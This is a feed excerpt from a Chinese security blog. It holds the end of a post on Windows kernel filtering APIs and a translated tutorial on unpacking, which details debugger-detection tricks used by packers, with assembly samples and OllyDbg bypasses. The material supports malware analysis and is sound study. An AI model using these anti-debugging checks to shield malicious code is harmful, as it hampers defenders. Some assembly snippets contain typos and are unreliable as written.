    <![CDATA[<h2 id="1-介绍">1.介绍</h2><p>这仅仅是一份供接受审阅和反馈的初稿。收到独立软件开发商的反馈后，一些内容和函数可能会改变。此外，这份文档仅限于适用Microsoft Windows Server® 2008。这些API是根据ISV社区讨论确定的，按照<a href="https://www.microsoft.com/downloads/details.aspx?FamilyId=4C7561E6-6F9D-4125-8A8C-AEAF8E3342B9&amp;displaylang=en">Kernel Evaluation Criteria</a>。<br>很多系统管理安全类应用程序都需要访问内核信息及过滤系统调用的能力，其中一些操作涉及一些进程、线程对象。之前，当第三方软件开发商（ISV）想实现监控/修改/阻断操作时，但操作系统现有提供的过滤回调不支持时，他们一般采用的方式为挂钩在内核服务表（SSDT）中这些内核对象管理（OB）的API。提供官方支持的文档及过滤和访问内核信息的接口有利于操作系统平台，因为挂钩SSDT从来没有官方支持过并且可能会影响操作系统的稳定性。此外，随着在x64平台采用内核补丁保护技术（KPP）,在x64平台，ISV不能像32位x86平台中那样使用SSDT Hook了。<br>]]>
    
    </summary>
    
      <category term="x64" scheme="http://www.youngroe.com/tags/x64/"/>
    
      <category term="内核" scheme="http://www.youngroe.com/tags/%E5%86%85%E6%A0%B8/"/>
    
      <category term="Windows" scheme="http://www.youngroe.com/categories/Windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[脱壳的艺术（翻译:The Art of Unpacking）]]></title>
    <link href="http://www.youngroe.com/2016/12/23/Learning/The-Art-of-Unpacking/"/>
    <id>http://www.youngroe.com/2016/12/23/Learning/The-Art-of-Unpacking/</id>
    <published>2016-12-23T11:25:23.000Z</published>
    <updated>2020-02-15T07:54:24.196Z</updated>
    <content type="html"><![CDATA[<h2 id="摘要">摘要</h2><p>脱壳是一门艺术，同时也是一种智力挑战，在逆向领域脱壳是最令人头脑兴奋的智力游戏之一。在某些情况下，逆向工作者需要对操作系统内部原理非常熟悉，这样才能识别和绕过壳开发人员的反逆向分析技术，耐心和聪明是成功脱壳的两个主要条件。这些挑战包括壳开发人员开发壳，同时在另一方面也包括逆向工作研究者如何绕过壳的这些保护。<br>这篇文章主要介绍了壳开发人员使用的一些反逆向工程技术，同时也讨论如何绕过和关闭这些保护的技术和一些公开的工具。当遇到被壳保护的恶意代码的时候，这些信息能让逆向工作研究人员尤其是恶意代码分析人员更加容易的去识别这些技术，然后绕过这些反逆向分析技术去进行下一步的分析工作。这篇文章的第二个目的是让一些开发人员能够去使用这些技术在一定程度上减缓被逆向分析的可能，给代码增加更多的保护。当然，遇到逆向分析高手的时候，什么方法都没辙。<br><strong>关键词</strong>：逆向工程，壳，保护，反调试，反逆向分析</p>
<a id="more"></a>
<h2 id="1-概述">1.概述</h2><p>在逆向工程领域，壳是最有趣的难题之一，在脱壳的过程中，逆向工作者会学到很多东西，包括操作系统原理、逆向技巧、逆向工具和技术。壳（本文中壳这个术语包含压缩壳和保护壳）是被用于保护可执行文件免受分析的一种技术。壳被商业软件合法使用，以防止信息泄露，篡改和盗版。不幸的是，恶意代码也以相同的目的使用壳，但目的却是恶意的。<br>因为有太多被加壳的恶意代码样本，研究者和恶意代码分析者为了分析这些样本开始去研究脱壳技术。同时，新的反逆向分析技术也不断的被用到壳的保护中，阻止逆向分析者去分析这些被保护的应用程序，同时也阻止这些被保护的应用程序被脱壳。经过不断的轮回发展，新的反逆向技术不断被开发同时在另一边逆向分析者也不断研究各种脱壳技巧、技术和工具。<br>这篇文章主要介绍壳使用的各种反逆向分析技术，同时也讨论如何去绕过和关闭壳的这些保护的工具和技术。在另一方面，内存dump等技术能轻松绕过某些壳的保护，那反逆向分析技术是不是不需要了呢？反调试技术还是必须的，在某些情况下被保护的代码需要被动态调试分析，如：</p>
<ul>
<li>部分保护的代码需要动态分析才能绕过，以便内存dump和输入表重建</li>
<li>需要深入分析被壳保护的代码，以便能提取特征用于反病毒软件使用</li>
</ul>
<p>除此之外，当遇到恶意代码使用反逆向分析技术去阻止被动态调试和分析恶意函数的时候，熟悉反逆向分析技术也是很有用的。<br>本文不是一个完整的反逆向分析技术列表，只包含了那些在壳里面经常被使用、有意思的技术。如果想学习更多的反逆向分析及逆向技术，建议读者参考本文最后一节提到的参考链接和书籍。<br>作者希望读者能够在本文中找到一些有用的技术、技巧。希望大家能在脱壳中找到乐趣。</p>
<h2 id="2-调试器检查技术">2.调试器检查技术</h2><p>本小结主要列举壳用于检测进程是否被调试的以及一个调试器是否运行的技术。调试器检测技术包含从非常简单的（明显）的利用APIs检测到利用内核对象（kernel objects）检测。</p>
<h3 id="2-1_PEB-BeingDebugged标志：IsDebuggerPresent()">2.1 PEB.BeingDebugged标志：IsDebuggerPresent()</h3><p>检测调试器最基本的方式是检查PEB(Process Environment Block,在windbg中的结构为_PEB)的BeingDebugged标志位。可以直接使用kernel32!IsDebuggerPresent()函数取这个标志位，检查进程是否被用户态调试器调试。<br>下面的代码展示了IsDebuggerPresent()这个API实际执行的代码，通过访问TEB（Thread Environment Block,在windbg中结构为_TEB）结构可以获得PEB的地址，BeingDebugged标志位在PEB偏移0x2处。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     eax,large fs:18h&#10;mov     eax,[eax+30h]&#10;movzx   eax,byte ptr [eax+2]&#10;retn</span><br></pre></td></tr></table></figure></p>
<p>为了防止逆向工作者在IsDebuggerPresent()函数下断点或则patch这个函数，一些壳会直接通过检查PEB的BeingDebugged标志而不调用IsDebuggerPresent()。<br><em>例子</em><br>下面的例子展示了使用IsDebuggerPresent()和PEB.BeingDebugged检测调试器的区别：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;call kernel32!IsDebuggerPresent()&#10;call    [IsDebuggerPresent]&#10;test    eax,eax&#10;jnz     .debugger_found&#10;&#10;;check PEB.BeingDebugged directly&#10;mov     eax,dword [fs:0x30] ;EAX=TEB.ProcessENvironmentBlock&#10;movzx   eax,byte [eax+0x02] ;AL= PEB.BeingDebugged&#10;test    eax,eax&#10;jnz     .debugger_found</span><br></pre></td></tr></table></figure></p>
<p>因为这种检测方式是非常明显的，所以壳一般会使用花指令或则反汇编方法去混淆这部分代码，这部分将会在后面的章节讨论。<br><em>解决方案</em><br>可以通过手工清零PEB.BeingDebugged标志位非常容易的绕过这种检测调试器的方法。在OllyDbg中可以通过在数据窗口按Ctrl+G快捷键然后输入fs:[30]查看PEB结构数据。<br>除此之外，可以通过Ollyscript（在工具章节会提到）命令“dbh” patch上面提到的标志位：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbh</span><br></pre></td></tr></table></figure></p>
<p>最后，olly Advanced插件暂时没有选项去设置BeingDebugged标志位清零。</p>
<h3 id="2-2_PEB-NtGlobalFlag,Heap_Flags">2.2 PEB.NtGlobalFlag,Heap Flags</h3><p>PEB.NtGlobalFlag:NtGlobalFlag是PEB中另一个标志位（PEB偏移0x68,名称为NtGlobalFlag）可以用来检测程序是否被调试器加载。正常情况下，当一个进程没有被调试NtGlobalFlag的值为0x0,当一个进程被调试的是否这个值一般为0x70,值为0x70是因为以下的标志位被设置：</p>
<ul>
<li>FLG_HEAP_ENABLE_TAIL_CHECK(0x10)</li>
<li>FLG_HEAP_EBABLE_FREE_CHECK(0x20)</li>
<li>FLG_HEAP_VALIDATE_PARAMETERS(0x40)</li>
</ul>
<p>这些标志位在函数ntdll!LdrpInitializeExecutionOptions()中被设置，同时需要注意PEB.NtGlobalFlag的默认值可以通过gflags.exe工具设置或则通过在注册表中设置键值改变：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</span><br></pre></td></tr></table></figure></p>
<p>Heap Flags:由于NtGlobalFlag的某些标志位被设置，创建堆的时候某些标志位也会被设置，这些设置主要在函数ntdll!RtlCreateHeap()函数中。最典型的，非调试状态下进程（PEB.ProcessHeap）创建的初始堆的标志位Flags和ForceFlags将会被设置为0x02（HEAP_GROWABLE）和0x0。然而当进程被调试的时候这两个标志位将会被设置为0x50000062(依赖NTGlobalFLag的值)和0x40000060(Flags和0x6001007D与运算得到)。默认情况下，当一个进程被调试的时候，堆创建的时候堆的这些标志位将会被设置：</p>
<ul>
<li>HEAP_TAIL_CHECKING_ENABLED(0x20)</li>
<li>HEAP_FREE_CHECKING_ENABLED(0x40)</li>
</ul>
<p><em>例子</em><br>下面的代码展示了当PEB.NtGlobalFlag不等于0的时候，PEB.ProcessHeap中一些标志位将会被设置：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;ebx = PEB&#10;mov     ebx,[fs:0x30]&#10;&#10;;check if PEB.NtGlobalFlag!=0&#10;cmp     dword [ebx+0x68],0&#10;jne     .debugger_found&#10;&#10;;eax = PEB.ProcessHeap&#10;mov     eax,[ebx+0x18]&#10;&#10;;check PEB.ProcessHeap.Flags&#10;cmp     dword [eax+0x0c],2&#10;jne     .debuger_found&#10;&#10;;check PEB.ProcessHeap.ForceFlags&#10;cmp     dword [eax+0x10],0&#10;jne     .debugger_found</span><br></pre></td></tr></table></figure></p>
<p><em>解决方法</em><br>解决方法就是将PEB.NtGlobalFlag和PEB.HeapProcess标志位设置为未调制状态下的值，下面展示了一个通过ollyscript去这只标志位的例子：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var     peb</span><br><span class="line">var     patch_addr</span><br><span class="line">var     process_heap</span><br><span class="line"></span><br><span class="line"><span class="comment">//retrieve PEB via a hardcoded TEB address (first thread:0x7ffde000)</span></span><br><span class="line">mov     peb,[<span class="number">7f</span>fde000+<span class="number">30</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">//patch PEB.NtGlobalFlag</span></span><br><span class="line">lea     patch_addr,[peb+<span class="number">68</span>]</span><br><span class="line">mov     [patch_addr],<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//patch PEB.ProcessHeap.Flag/ForceFlags</span></span><br><span class="line">mov     process_heap,[peb+<span class="number">18</span>]</span><br><span class="line">lea     patch_addr,[process_heap+<span class="number">0</span>c]</span><br><span class="line">mov     [patch_addr],<span class="number">2</span></span><br><span class="line">lea     patch_addr,[process_heap+<span class="number">10</span>]</span><br><span class="line">mov     [patch_addr],<span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<p>olly Advanced 插件也没有选项去设置PEB.NtGlobalFLags和PEB.ProcessHeap标志位。</p>
<h3 id="2-3_DebugPort:CheckRemoteDebuggerPresent()/NtQueryInformationProcess()">2.3 DebugPort:CheckRemoteDebuggerPresent()/NtQueryInformationProcess()</h3><p>Kernel32!CheckRemoteDebuggerPresent()是另一个可以检测进程是否正在被调试的API,这个API内部调用ntdll!NtQueryInformationProcess()参数ProcessInformationClass设置为ProcecssDebugPort(7)。而在内核中，NtQueryInformationProcess()通过查询EPROCESS(windbg中_EPROCESS结构)中的DebugPort字段。当被用户态调试器调试时，DebugPort的值将为非零，而ProcessINformation的值将会被设置为0xFFFFFFFF,否则正常情况下ProcessInformation的值为0x0。<br>Kernel32!CheckRemoteDebuggerPresent()函数有两个参数，第一个参数为进程句柄，第二个参数为一个指向BOOL类型的一个指针，当进程被调试的时候这个值将会被设置为TRUE。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CheckRemoteDebuggerPresent</span><span class="params">(</span><br><span class="line">    HANDLE hProcess,</span><br><span class="line">    PBOOL pbDebuggerPresent</span><br><span class="line">)</span></span></span><br></pre></td></tr></table></figure></p>
<p>Ntdll!NtQueryInformationProcess()有5个参数，为了检测调试器，参数ProcessInformationClass将会被设置为ProcessDebugPort(7):<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS NTAPI <span class="title">NtQueryInformationProcess</span><span class="params">(</span><br><span class="line">    HANDLE              ProcessHandle,</span><br><span class="line">    PROCESSINFOCLASS    ProcessInformationClass,</span><br><span class="line">    PVOID               ProcessInformation,</span><br><span class="line">    ULONG               ProcessInformationLength,</span><br><span class="line">    PULONG              RturnLength</span><br><span class="line">)</span></span></span><br></pre></td></tr></table></figure></p>
<p><em>例子</em><br>下面的例子展示了调用CheckRemoteDebuggerPresent()和NtQueryInformationProcess()去检测一个进程是否在被调试：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;using kernel32!CheckRemoteDebuggerPresent()&#10;lea     eax,[.bDebuggerPresent]&#10;push    eax                     ;pbDebuggerPresent&#10;push    0xffffffff              ;hProcess&#10;call    [CheckRemoteDebuggerPresent]&#10;cmp     dword [.bDebuggerPresent], 0&#10;jne     .debugger_found&#10;&#10;;using ntdll!NtQueryInformationProcess(ProcessDebugPort)&#10;lea     eax,[.dwReturnPort]&#10;push    eax                 ;ReturnLength&#10;push    4                   ;ProcessInformationLength&#10;lea     eax,[.dwDebugPort]&#10;push    eax                 ;ProcessInformation&#10;push    ProcessDebugPort    ;ProcessInformationClass(7)&#10;push    0xffffffff&#10;call    [NtQUeryInformationProcess]&#10;cmp     dword [.dwDebugPort],0&#10;jne     .debugger_found</span><br></pre></td></tr></table></figure></p>
<p><em>解决方法</em><br>一种解决方案是在NtQueryInformationProcess()函数返回的地方设置断点，当断点命中后，将ProcessInformation设置为0，下面是一个自动设置该值为0的ollyscript脚本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">var     bp_NtQueryInformationProcess</span><br><span class="line"></span><br><span class="line"><span class="comment">//set a breakpoint handler</span></span><br><span class="line">eob     bp_handler_NtQueryInformationProcess</span><br><span class="line"></span><br><span class="line"><span class="comment">//set a breakpoint where NtQueryInformationProcess returns</span></span><br><span class="line">gpa     <span class="string">"NtQueryInformationProcess"</span>, <span class="string">"ntdll.dll"</span></span><br><span class="line">find    $RESULT, <span class="preprocessor">#C21400#     <span class="comment">//return 14</span></span></span><br><span class="line">mov     bp_NtQueryInformationProcess,$RESULT</span><br><span class="line">bphws   bp_NtQueryInfomationProcess,<span class="string">"x"</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">bp_handler_NtQueryInformationProcess:</span><br><span class="line"><span class="comment">//ProcessInformationClass ==ProcessDebugPort?</span></span><br><span class="line">cmp     [esp+<span class="number">8</span>],<span class="number">7</span></span><br><span class="line">jne     bp_handler_NtQueryInformationProcess_continue</span><br><span class="line"></span><br><span class="line"><span class="comment">//patch ProcessInformation to 0</span></span><br><span class="line">mov     patch_addr,[esp+c]</span><br><span class="line">mov     [patch_addr],<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//clear breakpoint</span></span><br><span class="line">bphwc   bp_NtQUeryInformationProcess</span><br><span class="line"></span><br><span class="line">bp_handle_NtQueryInformationProcess_continue:</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p>Olly Advanced插件有一个选项去patch NtQueryInformationProcess()，实现通过注入操作NtQUeryInformationProcess()返回值的代码实现。</p>
<h3 id="2-4_调试器中断">2.4 调试器中断</h3><p>当软件断点指令INT3（断点）和INT1(单步)在调试器中触发的时候，正常情况下异常处理函数不会被调用因为调试器会首先处理这些中断产生的异常。因此壳可以在一场处理函数中设置一个标志位，如果这个标志位在中断指令执行后没有被设置，那就意味着这个进程正在被调试。另外一些壳会使用API代替中断指令，因为kernel32!DebugBreak()内部会调用INT3。<br><em>例子</em><br>在本例中当异常处理函数被调用的时候将会通过线程上线文（CONTEXT record）将EAX设置为0xFFFFFFFF:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;set exception handler&#10;push    .exception_handler&#10;push    dword [fs:0]&#10;mov     [fs:0],esp&#10;&#10;;reset flag(EAX) invoke int3&#10;xor     eax,eax&#10;int3&#10;&#10;;restore exception handler&#10;pop     dword [fs:0]&#10;add     esp,4&#10;&#10;;check if the flag had been set&#10;test    eax, eax&#10;je      .debugger_found&#10;&#10;.exception_handler:&#10;;EAX = ContextRecord&#10;mov     eax,[esp+0xc]&#10;;set flag (COntextRecord.EAX)&#10;mov     dword [eax+0xb0],0xfffffff&#10;;set ContextRecord.EIP&#10;inc     dword [eax+0xb8]&#10;xor     eax,eax&#10;retn</span><br></pre></td></tr></table></figure></p>
<p><em>解决方案</em><br>当使用ollydbg时，当由于调试中断引发步入或则执行终止，应该首先确定异常处理函数的地址（通过View-&gt;SEH Chain）,在异常处理函数地址设置断点。然后使用Shift+F9，当单步调试或则设置断点调试时这些异常将会被被一场处理函数处理。这样前面设置的断点就会命中，就可以找到一场处理函数。</p>
<div align="center"><br><img src="/img/2018_0523_02_04_.png" alt="设置忽略调试异常" align="center"><br></div><br>另一种解决方案是设置将单步/断点异常自动传递给一场处理函数，可以通过ollydbg选项设置：Options-&gt;Debugging Options-&gt;Exceptions-&gt;”Ignor following exceptions”，选中“INT 3 Breaks”和“Single-step break”。<br><br>### 2.5 时间检测<br>当进程正在被调试时，将会花几个CPU时钟周期去处理调试事件、单步调试等。壳就可以利用这多出来的指令执行时间的差异去检测调试器，如果时间花费比正常执行更长，则这个进程很可能正在被调试。<br><em>例子</em><br>下面是一个利用时间检测调试器的简单例子，使用RDTSC(Read Time-Stamp Counter)在指令执行前后读取时间，然后计算执行时间增量。这里这个增量为0x200,具体的增量取决于两个RDTSC指令之间需要执行的指令的数量。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdtsc&#10;mov     ecx,eax&#10;mov     ebx,edx&#10;;...more instructions&#10;nop&#10;push    eax&#10;pop     eax&#10;nop&#10;;...mor instructions&#10;&#10;;compute delta between RDTSC instructions&#10;rdtsc&#10;&#10;;Check high order bits&#10;cmp     ebx,ebx&#10;ja      .debugger_found&#10;;Check  low order bits&#10;sub     eax,ecx&#10;cmp     eax,0x200&#10;ja      .debugger_found</span><br></pre></td></tr></table></figure><br><br>时间变化还可以使用kernel32!GetTickCount()或则检查SharedUserData（_KUSER_SHARED_DATA）结构的偏移0xC处的TickCountLow和TickCountMultiplier。<br>当使用垃圾代码或则其他混淆技术去隐藏基于时间检测调试器技术时，将会很难去定位，特别是使用RDTSC指令时。<br><em>解决方案</em><br>一种绕过的方案是定位到时间检测的代码然后避免在这部分代码单步调试。调试者也可以在这在时间增量比较代码之前设置断点然后直接执行而不是单步，直到断点命中。除此之外也可以在GetTickCount()函数中设置断点，以确定它在那里被调用或修改GetTickCount的返回值。<br>Olly Advanced提供了另外一种解决方案，主要动过内核驱动程序实现，关键实现如下：<br>- 设置CR4寄存器的TSD标志位。当TSD标志位被设置时，如果RDTSC指令在内核模式之外被执行，GP(General Protection)异常将会被触发。<br>- 设置中断描述符表（IDT）,以便处理GP异常，过滤RTDSC指令执行，如果是因为执行RDTSC指令而出发GP异常的话，只需要在前一次返回的时间戳上加1返回即可。<br><br>需要注意的是因为驱动可能会造成系统不稳定，因此最好在非生产机或则虚拟机进行这个实验。<br><br>### 2.6. SeDebugPrivilege<br>默认情况下，进程的SeDebugPrivilege权限是没有启用的，但是当一个进程是被Ollydbg或则Windbg启动的时候,进程的SeDebugPrivilege权限是启用的。这是因为调试器一般会调整自己的token会启用SeDebugPrivilege权限，并且当调试器调试启动进程的时候权限会继承，因此被调试进程的SeDebugPrivilege也会被启用。<br>一些壳会通过试图去打开CSRSS.exe进程的句柄间接判断是否启用了SeDebugPrivilege权限判断是否正在被调试，如果能够打开CSRSS.exe进程就意味进程的SeDebugPrivilege权限已经被启用，同时暗示该进程有可能正在被调试。因为CSRSS.exe进程的安全描述符（security descriptor）只允许SYSTEM权限去打开，但是如果一个进程又SeDebugPrivilege权限，它就可以打开任意进程而无视折别描述符。注意默认情况下SeDebugPrivilege权限只能被赋予给Administrators组用户。<br><em>例子</em><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;query for the pid of csrss.exe&#10;call    [CsrGetProcessId]&#10;&#10;;try to open the csrss.exe process&#10;push    eax&#10;push    FALSE&#10;push    PROCESS_QUERY_INFORMATION&#10;call    [OpenProcess]&#10;&#10;;if OpenProcess() was successful&#10;;process is probably being debugged&#10;test     eax,eax&#10;jnz      .debugger_found</span><br></pre></td></tr></table></figure><br><br>上面的例子通过ntdll!CsrGetProcessId()获取csrss.exe的pid，但是壳可能会通过进程枚举的方式去获得csrss.exe的pid，如果OpenProcess()成功，则意味SeDebugPrivilege权限被启用，进程有可能正在被调试。<br><em>解决方案</em><br>一种解决方案是在ntdll!NtOpenProcess()返回处设置一个断点，如果传递的参数是进程csrss.exe的pid，一旦断点命中，将返回值EAX设置为0xC0000022(STATUS_ACCESS_DENIED)。<br><br>### 2.7 父进程检测<br>正常情况下一个进程的父进程应该是explorer.exe（如进程被双击执行），如果进程的父进程不是explorer.exe则进程有可能被其他进程启动则表明进程有可能正在被调试。<br>一种检测方式如下：<br>- 1.获得当前进程的pid通过TEB.ClientId或者使用GetCurrentProcessId()<br>- 2.通过Process32First/Next()进程遍历的方式记录下explorer.exe的PID（比较PROCESSENTRY32.szExeFile）和当前进程父进程的PID(PROCESSENTRY32.th32ParentProcessID)<br>- 3.如果当前进程的父进程PID不是explorer.exe的则表明当前进程可能正在被调试。<br>然而需要注意的是如果进程是通过命令行或则默认shell不是explorer.exe的时候这种调试器检测的方式将会出错。<br><em>解决方案</em><br>一种解决方案是使用Olly Advance去将Process32Next()执行设置为失败，这样壳列举进程的代码将会执行失败，就有可能因为列举进程失败跳过PID检查<br>。实现的方式是将EAX置零然后返回的代码去patch kernel32!Process32NextW()函数的入口。<br><div align="center"><br><img src="/img/2018_0523_2_7.png" alt align="center"><br></div>

<h3 id="2-8_DebugObject:NtQueryObject()">2.8 DebugObject:NtQueryObject()</h3><p>另一种反调试技术是检测当前系统调试器是否在运行，而不是检测当前进程是否正在被调试。<br>在逆向论坛中讨论的一个有趣的方式是检查<a href="http://www.openrce.org/articles/full_view/25" target="_blank" rel="external">DebugObject</a>内核对象的数量。这种检测方式的原理是只要一个进程被调试，在内核中肯定会为调试会话创建一个DebugObject内核对象。<br>DebugObject的数量可以通过ntdll!NtQueryObject()查询所有Object类型的信息获得。NtQueryObject需要5个参数，为了查询所有对象类型，ObjectHandle参数需要设置为NULL，ObjectInformationClass需要设置为ObjectAllTypeInformation(3)。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS NTAPI NtQueryObject(&#10;                            HANDLE ObjectHandle,&#10;                            OBJECT_INFORMATION_CLASS ObjectInformationClass,&#10;                            PVOID ObjectInformation,&#10;                            ULONG Length,&#10;                            PULONG ResultLength&#10;                            )</span><br></pre></td></tr></table></figure></p>
<p>NtQueryObject会返回一个OBJECT_ALL_INFORMATION结构，结构中类型为ObjectTypeInformation的参数NumberOfObjectsTypes是Object类型数量的一个数组。<br>然后检测函数会遍历ObjectTypeInformation类型的数组，数组中元素结构如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _OBJECT_TYPE_INFORMATION &#123;</span><br><span class="line">[<span class="number">00</span>] UNICODE_STRING TypeName;</span><br><span class="line">[<span class="number">08</span>] ULONG TotalNumberOfHandles;</span><br><span class="line">[<span class="number">0</span>C] ULONG TotalNumberOfObjects;</span><br><span class="line">... more fields ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>比较TypeName字段类型为UNICODE字符串是否为“DebugObject”，然后检查TotalNumberOfObjects或则TotalNumberOfHandles是否为非0。<br><em>解决方案</em><br>和NtQueryInformationProcess()的解决方案相似，可以在NtQueryObject()返回的地方设置一个断点，然后修改返回的OBJECT_ALL_INFORMATION结构。<br>具体操作方式就是将NumberOfobjectsTypes字段设置为0，这样就能阻止壳去遍历ObjectTypeInformation数组。可以通过创建一个Ollydbg脚本完成，类似之前的NtQueryInformationProcess()的解决方案。同样的，可以通过Olly advanced插件去修改NtQueryObject()这个API，如果查询类型是ObjectAllTypeInformation的话会将返回的buffer清零。</p>
<h3 id="2-9_调试窗口">2.9 调试窗口</h3><p>调试器窗口是否存在是系统中调试器是否运行的一个标志，因为调试器会创建的特定Class名称(OLLYDBG是OllyDbg,Windbg是WinDbgFrameClass)的窗口,调试器窗口可以通过user32!FindWindow()或者user32!FindWindowEx()找到。<br><em>例子</em><br>下面的例子会通过Findwindow()找Ollydbg、Windbg创建的窗口名称去检测Ollydbg或者Windbg是否在运行<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push    NULL&#10;push    .szWindowClassOllyDbg&#10;call    [FindWindowA]&#10;test    eax,eax&#10;jnz     .debugger_found&#10;push    NULL&#10;push    .szWindowClassWinDbg&#10;call    [FindWindowA]&#10;test    eax,eax&#10;jnz     .debugger_found&#10;.szWindowClassOllyDbg db &#34;OLLYDBG&#34;,0&#10;.szWindowClassWinDbg db &#34;WinDbgFrameClass&#34;,0</span><br></pre></td></tr></table></figure></p>
<p><em>解决方案</em><br>一种解决方案是在FindWindow()/FindWindowEx()入口设置断点。当断点命中的时候，修改参数lpClassName字符串使程序返回失败。另一种解决方案是直接将返回值设置为NULL。</p>
<h3 id="2-10_调试进程">2.10 调试进程</h3><p>另一种检测调试器的方法是枚举系统中所有的进程，检查进程名是否是调试器（如OllyDbg.exe、windbg.exe等），实现方式也特别简单，只需要调用Process32First/Next()然后检查进程名是否是一个调试器。<br>一些壳也会使用kernel32!ReadProcessMemory()读取进程的内存然后搜索调试器相关的字符串（如OLLYDBG）,以防止逆向者重命名调试器文件名。一旦检查到一个调试器，壳会展示一条错误信息，然后静默退出或则终止调试器。<br><em>解决方案</em><br>和父进程名检查相似，这里的解决方案也可以patch kernel32!Process32NextW()使函数总是返回失败阻止壳去枚举进程。</p>
<h3 id="2-11_驱动设备">2.11 驱动设备</h3><p>检查系统中是否运行内核调试器经典的方法是去访问内核调试器的设备驱动程序，这项技术非常简单，只需要调用kernel31!CreateFile()打开内核调试器（如SoftICE）公开的设备驱动名称。<br><em>例子</em><br>一个简单的检测如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push    NULL&#10;push    0&#10;push    OPEN_EXISTING&#10;push    NULL&#10;push    FILE_SHARE_READ&#10;push    GENERIC_READ&#10;push    .szDeviceNameNtice&#10;call    [CreateFileA]&#10;cmp     eax,INVALID_HANDLE_VALUE&#10;jne     .debugger_found&#10;.szDeviceNameNtice db &#34;\\.\NTICE&#34;,0</span><br></pre></td></tr></table></figure></p>
<p>一些版本的SoftICE也会在设备名称后面加数字就会使这种检测方法失效。在逆向论坛中提到了一种解决方法是在设备名称后面暴力附加数字直到正确的设备名称被找到。一些比较新版本的壳也会通过设备驱动名称去检测系统监控程序，如Regmon和FileMon。<br><em>解决方案</em><br>一种简单解决方案是在Kernel32!CreateFileW()中设置断点，当断点命中的时候，修改FileName参数或则修改返回值为INVALID_HANDLE_VALUE (0xFFFFFFFF)。</p>
